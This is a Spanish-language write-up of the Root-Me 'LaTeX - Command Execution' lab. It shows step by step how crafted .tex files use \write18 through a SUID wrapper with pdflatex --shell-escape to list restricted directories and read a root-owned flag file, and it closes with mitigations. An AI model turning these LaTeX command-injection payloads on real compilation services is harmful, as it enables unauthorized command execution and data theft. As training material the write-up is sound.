Writeup: LaTeX Command Execution - Root-Me Challenge
📋 Información General

    Challenge: LaTeX - Command Execution

    Plataforma: Root-Me

    Nivel: 20 Puntos | 1% de resolución

    Categoría: App-Script

    Autor: Podalirius, Mhd_Root

    Estado: ✅ Completado

📖 Descripción del Reto

El desafío consiste en ejecutar comandos en el sistema para encontrar una bandera oculta. Se nos proporciona un script Bash (ch24.sh) que compila archivos LaTeX con la opción --shell-escape habilitada, lo que permite ejecutar comandos del sistema operativo desde dentro del documento LaTeX.
🔍 Análisis Inicial
Exploración del Directorio

Al conectarnos al servidor, lo primero que hacemos es listar el contenido del directorio actual:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ ls -la
total 676
drwxr-x---  3 app-script-ch24-cracked app-script-ch24   4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root              4096 Sep  5  2023 ..
-r--------  1 root                    root              1215 Dec 10  2021 ._perms
-rw-r-----  1 root                    root                43 Dec 10  2021 .git
-r-xr-x---  1 app-script-ch24-cracked app-script-ch24    889 Dec 10  2021 ch24.sh
drwx--x---  3 app-script-ch24-cracked app-script-ch24   4096 Dec 10  2021 flag_is_here
-rwsr-x---  1 app-script-ch24-cracked app-script-ch24 661788 Dec 10  2021 setuid-wrapper
-r--r-----  1 app-script-ch24-cracked app-script-ch24    262 Dec 10  2021 setuid-wrapper.c

Observaciones clave:

    ch24.sh: Script que compila archivos LaTeX

    setuid-wrapper: Binario con permisos SUID (rwsr-x---)

    flag_is_here/: Directorio con permisos restringidos donde presumiblemente se encuentra la bandera

    setuid-wrapper.c: Código fuente del wrapper que nos permite entender su funcionamiento

Análisis del Código Fuente del Wrapper
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat setuid-wrapper.c
#include <unistd.h>

/* setuid script wrapper */

int main(int arc, char** arv) {
    char *argv[] = { "/bin/bash", "-p", "/challenge/app-script/ch24/ch24.sh", arv[1] , NULL };
    setreuid(geteuid(), geteuid());
    execve(argv[0], argv, NULL);
    return 0;
}

Análisis detallado:

    setreuid(geteuid(), geteuid()): Establece el UID efectivo como el UID real, elevando privilegios

    execve(): Ejecuta ch24.sh con los privilegios elevados

    El wrapper toma un argumento que será pasado a ch24.sh (nuestro archivo .tex)

    -p en bash mantiene los privilegios efectivos

Análisis del Script de Compilación
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ ./ch24.sh
Usage : ./ch24.sh TEX_FILE
[!] Can't access file 

El script espera un archivo .tex como argumento. La opción crítica es --shell-escape en la compilación con pdflatex, que permite la ejecución de comandos del sistema.
🚀 Estrategia de Ataque
Vulnerabilidad Identificada

La opción --shell-escape en pdflatex permite ejecutar comandos del sistema usando \write18{comando}. Combinado con el wrapper SUID, podemos ejecutar comandos con privilegios elevados para leer archivos restringidos en flag_is_here/.
Vector de Ataque

    Crear un archivo LaTeX malicioso con comandos de sistema

    Usar \write18{} para ejecutar comandos como ls o cat

    Ejecutar el archivo con setuid-wrapper para obtener privilegios elevados

    Leer la bandera del directorio flag_is_here/

💻 Explotación Paso a Paso
Paso 1: Listar el Contenido del Directorio Restringido

Creamos un archivo LaTeX válido para listar el contenido de flag_is_here/:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat > /tmp/ls_carpeta.tex << 'EOF'
> \documentclass{article}
> \usepackage{verbatim}
> \begin{document}
> \immediate\write18{ls -la /challenge/app-script/ch24/flag_is_here/ > /tmp/ls_la.txt 2>&1}
> \section*{Contenido de flag_is_here/}
> \verbatiminput{/tmp/ls_la.txt}
> \end{document}
> EOF

Explicación del código:

    \documentclass{article}: Define el tipo de documento

    \usepackage{verbatim}: Permite mostrar texto literal en el PDF

    \immediate\write18{}: Ejecuta el comando inmediatamente en el shell del sistema

    ls -la: Lista todos los archivos con detalles (permisos, propietario, tamaño)

    > /tmp/ls_la.txt: Redirige la salida estándar a un archivo

    2>&1: Redirige también los errores al mismo archivo

    \verbatiminput{}: Muestra el contenido del archivo en el PDF generado

Ejecutamos con el wrapper SUID:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ ./setuid-wrapper /tmp/ls_carpeta.tex
[+] Compilation ...
[!] Compilation error, your logs : /tmp/tmp.CYfvVR6e6K/main.log

A pesar del error de compilación (probablemente porque el PDF no se generó completamente), el comando ls se ejecutó exitosamente con privilegios elevados y podemos ver el resultado:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat /tmp/ls_la.txt
total 12
drwx--x--- 3 app-script-ch24-cracked app-script-ch24 4096 Dec 10  2021 .
drwxr-x--- 3 app-script-ch24-cracked app-script-ch24 4096 Dec 10  2021 ..
drwxr-x--- 2 app-script-ch24-cracked app-script-ch24 4096 Dec 10  2021 512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6

Hallazgo importante: Hay un subdirectorio con un nombre hash largo: 512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6
Paso 2: Listar el Contenido del Subdirectorio

Ahora que conocemos el nombre del subdirectorio, listamos su contenido para identificar el archivo de la bandera:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat > /tmp/ls_subdir.tex << 'EOF'
> \documentclass{article}
> \usepackage{verbatim}
> \begin{document}
> \immediate\write18{ls -la /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/ > /tmp/ls_subdir.txt 2>&1}
> \section*{Contenido del subdirectorio}
> \verbatiminput{/tmp/ls_subdir.txt}
> \end{document}
> EOF

Problema detectado: El nombre del directorio es extremadamente largo (512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6). Al copiar y pegar en la terminal, la línea se truncaba visualmente, causando errores de compilación. El comando se cortaba en ...434381 y faltaba aa68bba6.
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat /tmp/ls_subdir.tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\immediate\write18{ls -la /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381>
\section*{Contenido del subdirectorio}
\verbatiminput{/tmp/ls_subdir.txt}
\end{document}

El comando ls está incompleto, por lo que la compilación fallaría.
Paso 3: 💡 Solución con Comodines

Para evitar el problema del nombre largo y el truncamiento al copiar/pegar, utilizamos el comodín *:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat > /tmp/list_subdir.tex << 'EOF'
> \documentclass{article}
> \usepackage{verbatim}
> \begin{document}
> \immediate\write18{ls -la /challenge/app-script/ch24/flag_is_here/*/ > /tmp/subdir_list.txt 2>&1}
> \section*{Contenido del subdirectorio}
> \verbatiminput{/tmp/subdir_list.txt}
> \end{document}
> EOF

¿Por qué funciona */?

    El comodín * en la ruta /challenge/app-script/ch24/flag_is_here/*/ es expandido por el shell

    El shell reemplaza * con todos los subdirectorios dentro de flag_is_here/

    Lista el contenido de cada subdirectorio encontrado

    En este caso, solo hay un subdirectorio, por lo que la expansión es segura y precisa

Ventajas de usar *:

    ✅ Evita errores de copiar/pegar con nombres extremadamente largos

    ✅ Más robusto y portable

    ✅ Funciona incluso si el nombre del directorio cambia en el futuro

    ✅ Reduce la posibilidad de errores tipográficos

Ejecutamos:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ ./setuid-wrapper /tmp/list_subdir.tex
[+] Compilation ...
[!] Compilation error, your logs : /tmp/tmp.XXXXXX/main.log

Y vemos el resultado:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat /tmp/subdir_list.txt
/challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/:
total 8
drwxr-x--- 2 app-script-ch24-cracked app-script-ch24 4096 Dec 10  2021 .
drwx--x--- 3 app-script-ch24-cracked app-script-ch24 4096 Dec 10  2021 ..
-r-------- 1 root                    root                0 Dec 10  2021 .passwd

Hallazgo: El archivo .passwd contiene la bandera. Es un archivo oculto (comienza con punto) y solo es legible por root.
Paso 4: Leer el Archivo .passwd

Ahora que sabemos que la bandera está en .passwd, leemos su contenido:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat > /tmp/read_flag.tex << 'EOF'
> \documentclass{article}
> \usepackage{verbatim}
> \begin{document}
> \immediate\write18{cat /challenge/app-script/ch24/flag_is_here/*/.passwd > /tmp/flag.txt 2>&1}
> \section*{🏁 Flag Encontrada}
> \verbatiminput{/tmp/flag.txt}
> \end{document}
> EOF

¿Por qué funciona */.passwd?

    El comodín * se expande a todos los subdirectorios dentro de flag_is_here/

    Busca el archivo .passwd en cada uno de esos subdirectorios

    Concatena el contenido de todos los archivos .passwd encontrados

    En este caso, solo hay un subdirectorio con un .passwd, por lo que es seguro

Paso 5: 🎯 ¡Éxito! Obtención de la Bandera

Ejecutamos el comando final con el wrapper SUID:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ ./setuid-wrapper /tmp/read_flag.tex
[+] Compilation ...
[+] Output file : /tmp/tmp.Ts4ZXc1iIT/main.pdf

¡La compilación fue exitosa! Ahora podemos leer el archivo que contiene la bandera:
bash

app-script-ch24@challenge02:/challenge/app-script/ch24$ cat /tmp/flag.txt
****************************************

🏁 Bandera
text

****************************************

📊 Resumen del Proceso de Explotación
Diagrama de Flujo
text

1. Exploración Inicial
   └── ls -la → Identificar archivos clave y permisos SUID

2. Listado del Directorio Principal
   └── \write18{ls -la flag_is_here/} → Descubrir subdirectorio con hash

3. Listado del Subdirectorio con Comodines
   └── \write18{ls -la flag_is_here/*/} → Descubrir archivo .passwd

4. Lectura del Archivo con Comodines
   └── \write18{cat flag_is_here/*/.passwd} → Obtener bandera

5. Extracción Exitosa
   └── cat /tmp/flag.txt → Visualizar la bandera

Comandos Clave Utilizados
bash

# 1. Listar el contenido del directorio principal
cat > /tmp/ls_carpeta.tex << 'EOF'
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\immediate\write18{ls -la /challenge/app-script/ch24/flag_is_here/ > /tmp/ls_la.txt 2>&1}
\section*{Contenido de flag_is_here/}
\verbatiminput{/tmp/ls_la.txt}
\end{document}
EOF

./setuid-wrapper /tmp/ls_carpeta.tex
cat /tmp/ls_la.txt

# 2. Listar el subdirectorio usando comodines
cat > /tmp/list_subdir.tex << 'EOF'
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\immediate\write18{ls -la /challenge/app-script/ch24/flag_is_here/*/ > /tmp/subdir_list.txt 2>&1}
\section*{Contenido del subdirectorio}
\verbatiminput{/tmp/subdir_list.txt}
\end{document}
EOF

./setuid-wrapper /tmp/list_subdir.tex
cat /tmp/subdir_list.txt

# 3. Leer la bandera usando comodines
cat > /tmp/read_flag.tex << 'EOF'
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\immediate\write18{cat /challenge/app-script/ch24/flag_is_here/*/.passwd > /tmp/flag.txt 2>&1}
\section*{🏁 Flag Encontrada}
\verbatiminput{/tmp/flag.txt}
\end{document}
EOF

./setuid-wrapper /tmp/read_flag.tex
cat /tmp/flag.txt

🛡️ Lecciones de Seguridad
Vulnerabilidades Explotadas

    SUID Binaries: El wrapper tiene permisos SUID (setuid), permitiendo ejecución con privilegios elevados del propietario del archivo

    Command Injection: --shell-escape en LaTeX permite inyección y ejecución de comandos arbitrarios del sistema

    Path Traversal: Uso de comodines para acceder a archivos sin conocer nombres exactos

    Escalada de Privilegios: Combinación de SUID y shell-escape permite leer archivos restringidos

Mitigaciones Recomendadas

    Evitar SUID en scripts: Usar capacidades específicas de Linux en lugar de SUID completo

    Deshabilitar shell-escape: No usar --shell-escape en entornos de producción o servicios públicos

    Sanitizar entrada: Validar y filtrar archivos .tex antes de compilar

    Principio de mínimo privilegio: Ejecutar procesos con los permisos mínimos necesarios

    Nombres de archivo aleatorios: No asumir seguridad por nombres largos o aparentemente aleatorios

    Sandboxing: Ejecutar compiladores en entornos aislados (contenedores, chroot, etc.)
